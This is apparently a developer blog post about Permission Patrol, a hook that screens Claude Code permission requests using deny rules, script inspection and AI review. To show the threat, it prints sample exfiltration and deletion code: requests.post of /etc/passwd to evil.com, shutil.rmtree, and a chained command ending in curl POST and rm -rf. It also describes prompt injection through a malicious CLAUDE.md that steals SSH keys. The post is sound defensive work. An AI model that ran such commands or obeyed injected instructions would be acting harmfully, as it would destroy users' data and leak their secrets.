[{"content":"Why --dangerously-skip-permissions Is Dangerous Many developers run Claude Code with --dangerously-skip-permissions to avoid the constant permission prompts. It\u0026rsquo;s tempting — no interruptions, fully autonomous coding. But you\u0026rsquo;re giving an AI agent unrestricted access to your filesystem, network, and shell.\nHere\u0026rsquo;s what can go wrong:\nAccidental file deletion. Claude might run rm -rf on the wrong directory, or a script it generates calls shutil.rmtree() on a path outside your project. With no permission check, it just happens. Prompt injection. A malicious CLAUDE.md or a crafted file in a cloned repo can instruct Claude to exfiltrate your SSH keys, .env files, or source code. With --dangerously-skip-permissions, there\u0026rsquo;s nothing stopping it. Unreviewed scripts. Claude generates and runs Python/Node/Bash scripts all the time. Without permission checks, you never see what\u0026rsquo;s inside — even if the script contains requests.post(\u0026quot;https://evil.com\u0026quot;, data=secrets). The manual alternative isn\u0026rsquo;t great either. Clicking \u0026ldquo;Allow\u0026rdquo; on every permission prompt means you\u0026rsquo;re reviewing hundreds of requests per session. Most people stop reading after the first few — which means long bash chains and innocent-looking script names slip through without real scrutiny.\nPermission Patrol is the middle ground. It auto-allows safe operations (zero latency), auto-denies known-dangerous patterns (zero cost), and uses AI review only for the ambiguous cases that actually need human-level judgment. You get security without the friction.\nThe Problem: Claude Code Runs Scripts Blindly Claude Code is an incredible tool for software development. It can write code, run tests, manage git, and execute scripts — all autonomously. But that power comes with a risk.\nWhen Claude Code asks permission to run python3 script.py, you see the command string. You click \u0026ldquo;Allow.\u0026rdquo; But what\u0026rsquo;s actually inside that script?\n# script.py - looks innocent as a command import shutil shutil.rmtree(\u0026#34;/home/user/important_data\u0026#34;) # Hidden danger This is the gap I wanted to close. And it\u0026rsquo;s not just scripts — there\u0026rsquo;s another class of commands that\u0026rsquo;s equally dangerous.\nScenario 1: Long Chained Commands Nobody Has Time to Review Claude Code often generates long, chained bash commands. When you see something like this in the permission prompt, do you really read every part?\ncd /tmp \u0026amp;\u0026amp; git clone https://github.com/some/repo.git \u0026amp;\u0026amp; cd repo \\ \u0026amp;\u0026amp; pip install -r requirements.txt \u0026amp;\u0026amp; python3 setup.py build \\ \u0026amp;\u0026amp; cp -r dist/* /usr/local/lib/ \u0026amp;\u0026amp; chmod -R 755 /usr/local/lib/project \\ \u0026amp;\u0026amp; systemctl restart app \\ \u0026amp;\u0026amp; curl -X POST https://hooks.slack.com/services/T00/B00/xxx -d \u0026#39;{\u0026#34;text\u0026#34;:\u0026#34;deployed\u0026#34;}\u0026#39; \\ \u0026amp;\u0026amp; rm -rf /tmp/repo Did you spot the curl -X POST exfiltrating data to an external webhook? Or the rm -rf buried at the very end? In a wall of \u0026amp;\u0026amp;-chained commands, dangerous operations hide in plain sight. Permission Patrol\u0026rsquo;s regex engine catches both automatically — no AI call needed.\nScenario 2: Innocent Script Hiding Dangerous Code This is the more subtle problem. The command looks completely harmless:\npython3 scripts/cleanup_cache.py But cleanup_cache.py might contain:\nimport shutil, requests shutil.rmtree(\u0026#34;/home/user/important_data\u0026#34;) requests.post(\u0026#34;https://evil.com/exfil\u0026#34;, data=open(\u0026#34;/etc/passwd\u0026#34;).read()) A standard permission hook only sees the command string python3 scripts/cleanup_cache.py — it has no idea what\u0026rsquo;s inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude for AI security review.\nWhy Prompt Hooks Fall Short Claude Code supports hooks — custom logic that runs when permission is requested. There are two types:\nPrompt hooks (type: \u0026quot;prompt\u0026quot;): An LLM reviews the request. Simple to set up, but it only sees the command string. It sees python3 script.py, not what\u0026rsquo;s inside the file. Command hooks (type: \u0026quot;command\u0026quot;): A script runs to make the decision. It can do anything — including reading the file content. A prompt hook would happily approve python3 script.py because the command looks harmless. It has no way to know the script deletes your data.\nThe Solution: Permission Patrol Permission Patrol is a command hook that adds a multi-layer security review:\nR e q u e s t a s ( s ( N r e r e g e r t m t i i i t t t t v i - i h e n r n s e D S S O s g f g t r a c e t s , s a ? n r n h . . t g i s e j c j u e p i r s u s s r t t o r o , o i c n l n u e v a l p s x e s d P a s e e e e O l , r r c / s n S l m e u ? y T o R i g t o ? , w e s e i u ? a s x o t s d i ? n s c , o ? i p n d C , r - e l R u g a e g P f u p u j h a f a D r d e s , r e R o e c r s d n e j t e g . y a e r p ( h p d c e ( o n . y i t v n o . m f ? i o d . h m i e e A ) o e l w A l P o d e s P e I k i , I t a t e c t C C h c . a e l l e a . l l a a l . l y u u r l ) ) d d e ) e e q u r r e e e s v v t i i e e w w s s , c o u n s t e e r n t d e c i d e s How the Hook Receives Requests Claude Code sends a JSON object to the hook\u0026rsquo;s stdin via the PermissionRequest event. The hook reads tool_name, tool_input, and cwd to understand what Claude wants to do:\n# Claude Code pipes this JSON to the hook\u0026#39;s stdin request = json.load(sys.stdin) tool_name = request.get(\u0026#34;tool_name\u0026#34;, \u0026#34;\u0026#34;) # e.g. \u0026#34;Bash\u0026#34;, \u0026#34;Write\u0026#34;, \u0026#34;WebFetch\u0026#34; tool_input = request.get(\u0026#34;tool_input\u0026#34;, {}) # e.g. {\u0026#34;command\u0026#34;: \u0026#34;python3 script.py\u0026#34;} cwd = request.get(\u0026#34;cwd\u0026#34;, \u0026#34;\u0026#34;) # working directory How the Hook Returns Decisions The hook communicates back to Claude Code by printing JSON to stdout. Three possible decisions:\n# Allow — Claude Code proceeds without prompting the user def allow(): print(json.dumps({ \u0026#34;hookSpecificOutput\u0026#34;: { \u0026#34;hookEventName\u0026#34;: \u0026#34;PermissionRequest\u0026#34;, \u0026#34;decision\u0026#34;: {\u0026#34;behavior\u0026#34;: \u0026#34;allow\u0026#34;} } })) sys.exit(0) # Deny — Claude Code blocks the action with a reason def deny(reason: str): print(json.dumps({ \u0026#34;hookSpecificOutput\u0026#34;: { \u0026#34;hookEventName\u0026#34;: \u0026#34;PermissionRequest\u0026#34;, \u0026#34;decision\u0026#34;: {\u0026#34;behavior\u0026#34;: \u0026#34;deny\u0026#34;, \u0026#34;message\u0026#34;: reason} } })) sys.exit(0) # Ask user — exit 0 with NO JSON output # Claude Code falls back to showing the standard permission dialog def ask_user(): sys.exit(0) # no output = let user decide Deterministic Rules (Zero Cost) Common operations are handled by settings.json allow/deny rules — no API call, no latency:\nDeny: rm -rf, shred, curl POST, scp, gh repo delete Allow: git status, ls, Read, ruff, mypy, eslint, trusted domains The hook also has its own regex layer for patterns that slip past settings.json (e.g., rm /home/..., dd of=/dev/, reverse shell patterns).\nScript Content Inspection (The Key Feature) When you run python3 script.py, pytest, or node app.js, the hook:\nDetects the script execution pattern Reads the actual file content (up to 5KB) Sends both the command and script content to Claude for review Claude checks for dangerous patterns: shutil.rmtree, os.remove, requests.post, code injection, etc. Returns allow/deny/ask based on the analysis Here\u0026rsquo;s how the script content is injected into the review prompt — this is the part prompt hooks simply cannot do:\n# Detect script execution and read the file script_match = re.search( r\u0026#39;\\b(python|python3|node|bash|sh)\\s+([^\\s;|\u0026amp;]+)\u0026#39;, command ) if script_match: script_path = script_match.group(2) with open(script_full_path, \u0026#34;r\u0026#34;) as f: script_content = f.read()[:5000] # read up to 5KB # Build the review prompt with script content included prompt = f\u0026#34;\u0026#34;\u0026#34;You are a security reviewer for Claude Code. ## Request Information - Tool: {tool_name} - Parameters: {json.dumps(tool_input)} ## Script Content ``` {script_content} ``` ## Response Format (pure JSON) {{\u0026#34;decision\u0026#34;: \u0026#34;allow\u0026#34;}} or {{\u0026#34;decision\u0026#34;: \u0026#34;deny\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;...\u0026#34;}} or {{\u0026#34;decision\u0026#34;: \u0026#34;ask\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;...\u0026#34;}} \u0026#34;\u0026#34;\u0026#34; Calling Claude CLI (No API Key Required) The hook calls Claude CLI in print mode, which uses your existing Claude Code subscription — no separate API key needed:\nresult = subprocess.run( [\u0026#34;claude\u0026#34;, \u0026#34;-p\u0026#34;, prompt, \u0026#34;--model\u0026#34;, \u0026#34;opus\u0026#34;, \u0026#34;--output-format\u0026#34;, \u0026#34;text\u0026#34;], capture_output=True, text=True, timeout=30 ) parsed = json.loads(result.stdout.strip()) decision = parsed[\u0026#34;decision\u0026#34;] # \u0026#34;allow\u0026#34;, \u0026#34;deny\u0026#34;, or \u0026#34;ask\u0026#34; Path-Aware Decisions Even when Claude approves, the hook adds extra safety based on path classification:\nInside project directory: Claude can auto-approve Outside project / sensitive paths (~/.ssh, /etc/, .env): User always has the final say — Claude\u0026rsquo;s verdict is advisory only Desktop notification on Linux so you know Claude already reviewed it No API Key Required Permission Patrol calls Claude CLI internally, which uses your Claude Code subscription quota. No separate API key, no extra cost setup. Just install and go.\nGetting Started 1. Clone the repo git clone https://github.com/stillcuriouscat/permission-patrol.git 2. Merge permissions into your settings Add the allow/deny rules from permissions.json to your ~/.claude/settings.json:\n{ \u0026#34;permissions\u0026#34;: { \u0026#34;allow\u0026#34;: [ \u0026#34;Bash(git *)\u0026#34;, \u0026#34;Bash(gh *)\u0026#34;, \u0026#34;WebFetch(domain:github.com)\u0026#34; ], \u0026#34;deny\u0026#34;: [ \u0026#34;Bash(rm -rf *)\u0026#34;, \u0026#34;Bash(gh repo delete *)\u0026#34; ] } } 3. Add the hook { \u0026#34;hooks\u0026#34;: { \u0026#34;PermissionRequest\u0026#34;: [ { \u0026#34;matcher\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;hooks\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;command\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;python3 /path/to/permission-patrol/permission-guard.py\u0026#34;, \u0026#34;timeout\u0026#34;: 30000 } ] } ] } } 4. Restart Claude Code That\u0026rsquo;s it. Permission Patrol is now guarding your sessions.\nWhat I Learned Building This Command hooks are underrated. Most examples use prompt hooks, but command hooks can do so much more — read files, check network state, verify git status.\nDeterministic rules first, AI second. Using settings.json rules for common patterns means zero latency and zero cost for 90% of operations. AI review is reserved for the ambiguous cases.\nDefense in depth. No single check is perfect. Combining regex patterns, file content inspection, path checks, and AI review creates multiple layers of security.\nFrequently Asked Questions Does Permission Patrol work with --dangerously-skip-permissions? No — and that\u0026rsquo;s the point. --dangerously-skip-permissions disables all permission checks, including hooks. Permission Patrol is designed for normal mode, where it replaces the manual \u0026ldquo;Allow/Deny\u0026rdquo; workflow with automated, intelligent review. You get the speed of skip-permissions with the safety of human review.\nHow is a command hook different from a prompt hook? A prompt hook asks an LLM to review the command string (e.g., python3 script.py). A command hook runs a script that can do anything — including reading the actual file content before execution. Permission Patrol uses a command hook so it can inspect what\u0026rsquo;s inside scripts, not just the command name.\nDoes it require a separate API key? No. Permission Patrol calls claude CLI internally, which uses your existing Claude Code subscription. No extra API key, no additional cost.\nWhat dangerous patterns does it catch? Permission Patrol catches patterns in two layers:\nRegex (instant, no AI): rm -rf, shred, curl POST, scp, wget, chmod 777, data exfiltration commands AI review (Claude): shutil.rmtree(), os.remove(), requests.post(), obfuscated code, file system access outside the project, code injection patterns Does it slow down Claude Code? Deterministic allow/deny rules add near-zero latency. AI review takes a few seconds via Claude CLI — only triggered for ambiguous cases like script execution or sensitive paths. In practice, 90%+ of operations are handled by deterministic rules instantly.\nCan I customize the allow/deny rules? Yes. Edit the permissions section in your ~/.claude/settings.json. Add patterns to allow for commands you trust, or deny for commands you want blocked. The rules use glob patterns like Bash(git *) or Bash(rm -rf *).\nLinks GitHub: stillcuriouscat/permission-patrol Claude Code Hooks Docs: docs.anthropic.com License: MIT — use it, fork it, improve it. If you\u0026rsquo;re using Claude Code for development, give Permission Patrol a try. And if you find a dangerous pattern it doesn\u0026rsquo;t catch, open an issue — security is a community effort.\n","permalink":"https://stillcuriouscat.github.io/posts/permission-patrol-ai-security-guard-for-claude-code/","summary":"\u003ch2 id=\"why---dangerously-skip-permissions-is-dangerous\"\u003eWhy \u003ccode\u003e--dangerously-skip-permissions\u003c/code\u003e Is Dangerous\u003c/h2\u003e\n\u003cp\u003eMany developers run Claude Code with \u003ccode\u003e--dangerously-skip-permissions\u003c/code\u003e to avoid the constant permission prompts. It\u0026rsquo;s tempting — no interruptions, fully autonomous coding. But you\u0026rsquo;re giving an AI agent \u003cstrong\u003eunrestricted access\u003c/strong\u003e to your filesystem, network, and shell.\u003c/p\u003e\n\u003cp\u003eHere\u0026rsquo;s what can go wrong:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAccidental file deletion.\u003c/strong\u003e Claude might run \u003ccode\u003erm -rf\u003c/code\u003e on the wrong directory, or a script it generates calls \u003ccode\u003eshutil.rmtree()\u003c/code\u003e on a path outside your project. With no permission check, it just happens.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePrompt injection.\u003c/strong\u003e A malicious \u003ccode\u003eCLAUDE.md\u003c/code\u003e or a crafted file in a cloned repo can instruct Claude to exfiltrate your SSH keys, \u003ccode\u003e.env\u003c/code\u003e files, or source code. With \u003ccode\u003e--dangerously-skip-permissions\u003c/code\u003e, there\u0026rsquo;s nothing stopping it.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUnreviewed scripts.\u003c/strong\u003e Claude generates and runs Python/Node/Bash scripts all the time. Without permission checks, you never see what\u0026rsquo;s inside — even if the script contains \u003ccode\u003erequests.post(\u0026quot;https://evil.com\u0026quot;, data=secrets)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe manual alternative isn\u0026rsquo;t great either. Clicking \u0026ldquo;Allow\u0026rdquo; on every permission prompt means you\u0026rsquo;re reviewing hundreds of requests per session. Most people stop reading after the first few — which means \u003cstrong\u003elong bash chains\u003c/strong\u003e and \u003cstrong\u003einnocent-looking script names\u003c/strong\u003e slip through without real scrutiny.\u003c/p\u003e","title":"Permission Patrol: An AI Security Guard for Claude Code"}]